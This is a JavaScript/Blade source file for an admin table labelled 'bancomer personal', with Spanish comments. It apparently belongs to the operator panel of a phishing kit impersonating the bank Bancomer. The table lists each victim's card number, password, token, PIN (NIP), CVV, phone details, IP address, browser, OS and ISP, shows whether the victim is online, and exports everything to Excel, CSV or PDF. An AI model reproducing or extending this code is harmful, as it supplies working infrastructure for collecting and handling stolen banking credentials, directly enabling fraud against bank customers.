//oculta el form etiquetas
    $("#panel-etiquetas").hide();

    //Convierte el string de laravel a HTML tags
    function decodeHTML(str){ return $('<div>').html(str).text(); }

    //Funcion cancelarform enconde form etiquetas y muestra tabla datatable
    function cancelarform(){$("#panel-etiquetas").hide();$("#panel-tabla").show();}

    //Muestra todos los tags disponibles asi como las que estan seleccionadas por el 
    //logo personal
    function mostrar(id_bancomer_personal)
    {
        $("#panel-tabla").hide();
        $("#panel-etiquetas").show();

        var dir_etiquetas_populate = "/bancomer/etiquetas/populate";

        $.get(dir_etiquetas_populate+"/"+id_bancomer_personal,function(r){
            $("#etiquetas").html(r);
        });

        $("#id_bancomer_personal").val(id_bancomer_personal);
        
        
    }

    

    $(document).ready(function() {
        var tabla = ""

    //funcion que envia valores a la bd
    $("#formulario").on("submit",function(e){
        e.preventDefault(); //No se activará la acción predeterminada del evento
        $("#btnGuardar").prop("disabled",true);
        var formData = new FormData($("#formulario")[0]);
        // console.log($("#formulario")[0])
        $.ajax({
            url: "{{ route('bancomer.personal.etiquetas.update') }}",
            type: "post",
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            },
            data: formData,
            contentType: false,
            processData: false,
            success: function(datos)
            {
                  toastr.success("Etiqueta(s) actualizada(s) exitosamente!");
                  cancelarform();
                  tabla.ajax.reload();
                  $("#btnGuardar").prop("disabled",false);
            }

        });
    });

    /* Formatting function for row details - modify as you need */
    function format ( d ) {
       return decodeHTML( d['formatoTag']);
    }

     tabla =  $('#tabla').DataTable({
          "aProcessing":true,
          "aServerSide":true,
          dom: 'Bfrtip',
          buttons:[
            'copyHtml5',
            'excelHtml5',
            'csvHtml5',
            {
                extend: 'pdfHtml5',
                orientation: 'landscape',
                pageSize: 'LEGAL'
            }
          ],
          "ajax":
                {
                    url: "{{ route('bancomer.personal.populate') }}",
                    type : "get",
                    dataType : "json",
                    error: function(e){
                        console.log(e.responseText);
                    }
                },
          "columns":[
                {
                    "className":      'details-control',
                    "orderable":      false,
                    "data":           null,
                    "defaultContent": ''
                },
                {"data":"botones"},
                {"data":"estatus" },
                {"data":"id"},
                {"data":"n_tarjeta"},
                {"data":"nombre"},
                {"data":"contrasena"},
                {"data":"token"},
                {"data":"nip"},
                {"data":"cvv"},
                {"data":"compania"},
                {"data":"telefono"},
                {"data":"mi_telcel"},
                {"data":"ip"},
                {"data":"navegador"},
                {"data":"os"},
                {"data":"isp"},
                {"data":"created_at"},
          ],
          "aoColumnDefs": [
                
               {
                    "aTargets": [1],
                    // "aTargets": [0],
                    "mData": "botones",
                    "mRender": function (data, type, full) {
                        return '<div class="row"><input type="hidden" value="'+data+'" id="id_bancomer_personal_hidden"><button class="btn btn-primary btn-sm" style="margin-right: 2px;"  onclick="mostrar('+data+')"><i class="fa fa-tags"></i></button></div>';
                    }
                },
               {
                    "aTargets": [2],
                    // "aTargets": [0],
                    "mData": "estatus",
                    "mRender": function (data, type, full) {
                        if(data == "OnLine")
                            return '<span class="label label-info bg-white">'+data+'</span>';
                        else
                            return '<span class="label label-danger bg-white">'+data+'</span>';
                    }
                },
               {
                    "aTargets": [14],
                    // "aTargets": [0],
                    "mData": "estatus",
                    "mRender": function (data, type, full) {
                        if(data == "Internet explorer")
                            return '<img src="{{asset("images/explorador.svg")}}" alt="Internet Explorer" height="25px" />'
                        else if(data == "Mozilla Firefox")
                            return '<img src="{{asset("images/firefox.svg")}}" alt="Firefox" height="25px" />'
                        else if(data == "Google Chrome")
                            return '<img src="{{asset("images/cromo.svg")}}" alt="Chrome" height="25px" />'
                        else if(data == "Opera Mini")
                            return '<img src="{{asset("images/opera.svg")}}" alt="Opera Mini" height="25px" />'
                        else if(data == "Opera")
                            return '<img src="{{asset("images/opera.svg")}}" alt="Opera" height="25px" />'
                        else if(data == "Safari")
                            return '<img src="{{asset("images/safari.svg")}}" alt="Safari" height="25px" />'
                        else if(data == "Something else")
                            return '<img src="{{asset("images/navegador.svg")}}" alt="Desconocido" height="25px" />'

                    }
                },
                {
                    "aTargets": [15],
                    // "aTargets": [0],
                    "mData": "estatus",
                    "mRender": function (data, type, full) {
                        if(data == "Windows")
                            return '<img src="{{asset("images/microsoft.svg")}}" alt="microsoft" height="25px" />'
                        else if(data == "Linux")
                            return '<img src="{{asset("images/linux.svg")}}" alt="linux" height="25px" />'
                        else if(data == "Android")
                            return '<img src="{{asset("images/androide.svg")}}" alt="androide" height="25px" />'
                        else if(data == "Mac")
                            return '<img src="{{asset("images/mac.svg")}}" alt="mac" height="25px" />'
                        else if(data == "Firefox OS")
                            return '<img src="{{asset("images/firefox.svg")}}" alt="firefox os" height="25px" />'
                        else 
                            return '<img src="{{asset("images/navegador.svg")}}" alt="Desconocido" height="25px" />'

                    }
                }
            ],
          "bDestroy":true,
          "iDisplayLength":100,
          "order":[[0,"desc"]],
          "language": {
            "paginate": {
              "previous": "Ant.",
              "next": "Sig."
            },
          }
      });

      
       var detailRows = [];
    // Add event listener for opening and closing details
    $('#tbllistado tbody').on('click', 'tr td.details-control', function () {
        var tr = $(this).closest('tr');

        // var tr = $(this.node());
        var row = tabla.row( tr );
        var idx = $.inArray( row.data()[1], detailRows );
        
        // this.child(format(tr.data('child-value'))).show();
        // tr.addClass('shown');

        if ( row.child.isShown() ) {
            row.child.hide();
            tr.removeClass('shown');
            // Remove from the 'open' array
            detailRows.splice( idx, 1 );

        }else {
            
            row.child( format(row.data()) ).show();
            tr.addClass('shown');

            // Add to the 'open' array
            if ( idx === -1 ) {
                detailRows.push( tr.attr('id') );
            }
        }
    } );

    tabla.on('draw.dt', function () {
        tabla.rows().every(function () {
          this.child(  format(this.data())  ).show();
          this.nodes().to$().addClass('shown');
        });
    });


    });